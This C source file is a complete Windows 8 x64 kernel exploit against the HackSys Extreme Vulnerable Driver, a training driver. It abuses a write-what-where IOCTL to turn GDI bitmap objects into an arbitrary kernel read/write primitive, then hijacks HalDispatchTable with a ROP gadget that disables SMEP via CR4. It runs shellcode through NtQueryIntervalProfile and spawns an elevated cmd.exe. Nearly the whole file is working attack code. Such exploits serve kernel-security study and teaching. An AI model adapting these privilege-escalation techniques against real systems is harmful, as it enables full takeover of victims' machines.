#include<stdio.h>
#include<Windows.h>
#include<Psapi.h>
#include<profileapi.h>
#include "ShellCode.h"

/************************************************************************/
/*                 Write by Thunder_J 2019.7                            */
/*                     Write-What-Where                                 */
/*			Windows 8 x64					*/
/************************************************************************/

HANDLE hDevice = NULL;
DWORD64 ROPgadgets = 0;
HBITMAP hManagerBitmap = NULL;
HBITMAP hWorkerBitmap = NULL;
LPVOID pManagerPrvScan0 = NULL;
LPVOID pWorkerPrvScan0 = NULL;

DWORD64 getGdiShreadHandleTableAddr()
{
	DWORD64 tebAddr = (DWORD64)NtCurrentTeb();
	DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + 0x60);
	DWORD64 GdiShreadHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + 0xf8);
	return GdiShreadHandleTableAddr;
}

DWORD64 getBitMapAddr(HBITMAP hBitmap)
{
	WORD arrayIndex = LOWORD(hBitmap);
	return *(PDWORD64)(getGdiShreadHandleTableAddr() + arrayIndex * 0x18);
}

BOOL init()
{
	printf("[+]Start to get HANDLE");
	// Get HANDLE
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		return FALSE;
	}
	printf(" => done!\n");
	return TRUE;
}

DWORD64 ntoskrnlbase()
{
	LPVOID lpImageBase[0x100];
	LPDWORD lpcbNeeded = NULL;
	TCHAR lpfileName[1024];

	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, (DWORD64)sizeof(lpImageBase), lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 0x40);

		if (!strcmp((LPSTR)lpfileName, "ntoskrnl.exe"))
		{
			return lpImageBase[i];
		}
	}
	return NULL;
}

DWORD64 GetHalOffset_8()
{
	// ntkrnlpa.exe in kernel space base address
	DWORD64 pNtkrnlpaBase = ntoskrnlbase();
	printf("[+]ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);
	// ntkrnlpa.exe in user space base address
	HMODULE hUserSpaceBase = LoadLibraryA("ntoskrnl.exe");

	// HalDispatchTable in user space address
	DWORD64 pUserSpaceAddress = (DWORD64)GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	printf("[+]pUserSpaceAddress address is 0x%p\n", pUserSpaceAddress);

	DWORD64 hal_8 = (DWORD64)pNtkrnlpaBase + ((DWORD64)pUserSpaceAddress - (DWORD64)hUserSpaceBase) + 0x8;

	return (DWORD64)hal_8;
}

VOID ConstrutShellcode()
{
	printf("[+]Start to construt Shellcode\n");
	VOID* shellAddr = (void*)0x100000;
	shellAddr = VirtualAlloc(shellAddr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memset(shellAddr, 0x41, 0x1000);
	CopyMemory((VOID*)0x100300, ShellCode, 0x200);
	//__debugbreak();
	UINT64* recoverAddr = (UINT64*)((PBYTE)(0x100300) + 0x44);
	*(recoverAddr) = (DWORD64)ntoskrnlbase() + 0x4c8f75; // nt!KeQueryIntervalProfile+0x25
}

VOID GetBitmap()
{
	CHAR buf[0x64 * 0x64 * 4];

	printf("[+]Started to get PrvScan0\n");

	hManagerBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	//__debugbreak();
	hWorkerBitmap = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	//__debugbreak();

	DWORD64 leakManagerAddr = getBitMapAddr(hManagerBitmap);
	DWORD64 leakWorkerAddr = getBitMapAddr(hWorkerBitmap);
	printf("[+]hManagerBitmap address is 0x%p\n", leakManagerAddr);
	printf("[+]leakWorkerAddr address is 0x%p\n", leakWorkerAddr);

	pManagerPrvScan0 = leakManagerAddr + 0x50;
	pWorkerPrvScan0 = leakWorkerAddr + 0x50;

	printf("[+]pManagerPrvScan0 address is : 0x%p\n", pManagerPrvScan0);
	printf("[+]pWorkerPrvScan0 address is : 0x%p\n", pWorkerPrvScan0);
}

VOID Trigger_shellcode(UINT64 where, UINT64 what)
{

	WRITE_WHAT_WHERE exploitlow;
	WRITE_WHAT_WHERE exploithigh;
	DWORD lpbReturn = 0;

	UINT32 lowValue = what;
	UINT32 highvalue = (what >> 0x20);

	exploitlow.What = (PULONG_PTR)& what;
	exploitlow.Where = (PULONG_PTR)where;

	printf("[+]Start to trigger ");

	DeviceIoControl(hDevice,
		0x22200B,
		&exploitlow,
		0x10,
		NULL,
		0,
		&lpbReturn,
		NULL);

	exploithigh.What = (PULONG_PTR)& highvalue;
	exploithigh.Where = (PULONG_PTR)(where + 0x4);

	DeviceIoControl(hDevice,
		0x22200B,
		&exploithigh,
		0x10,
		NULL,
		0,
		&lpbReturn,
		NULL);

	printf("=> done!\n");
}

VOID SMEP_bypass_ready()
{
	ConstrutShellcode();
	ROPgadgets = (DWORD64)ntoskrnlbase() + 0x03777cc;
	/*nt!KiConfigureDynamicProcessor+0x40:
	* 	fffff803`20ffe7cc 0f22e0          mov     cr4,rax
	*	fffff803`20ffe7cf 4883c428        add     rsp,28h
	* 	fffff803`20ffe7d3 c3              ret
	*/
	printf("[+]ROPgadgets address is 0x%p\n", ROPgadgets);
	GetBitmap();
	Trigger_shellcode((DWORD64)pManagerPrvScan0, (DWORD64)pWorkerPrvScan0);
}

VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
{
	SetBitmapBits(hManagerBitmap, len, &whereRead);
	GetBitmapBits(hWorkerBitmap, len, whatValue);	// read
}

VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
{
	SetBitmapBits(hManagerBitmap, len, &whereWrite);
	SetBitmapBits(hWorkerBitmap, len, &whatValue);	// write
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
	DWORD64 interVal = 0;
	ULONG_PTR newcr4 = 0x406f8;

	if (init() == FALSE)
	{
		printf("[+]Failed to get HANDLE!!!\n");
		system("pause");
		return -1;
	}
	//__debugbreak();
	SMEP_bypass_ready();

	DWORD64 Hal_hook_address = GetHalOffset_8();
	printf("[+]Hook address is 0x%p\n", Hal_hook_address);

	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
	
	printf("[+]NtQueryIntervalProfile address is 0x%p\n", NtQueryIntervalProfile);
	
	LPVOID lpRealHooAddress = NULL;
	readOOB(Hal_hook_address, &lpRealHooAddress, sizeof(LPVOID));
	printf("[+]lpRealHooAddress is 0x%p\n",lpRealHooAddress);

	writeOOB(Hal_hook_address, (LPVOID)ROPgadgets, sizeof(DWORD64));
	Sleep(50);
	//__debugbreak();
	NtQueryIntervalProfile(0x100300, (PULONG)& newcr4);
	Sleep(50);
	writeOOB(Hal_hook_address, (LPVOID)lpRealHooAddress, sizeof(DWORD64));

	CreateCmd();
	system("pause");
	return 0;
}
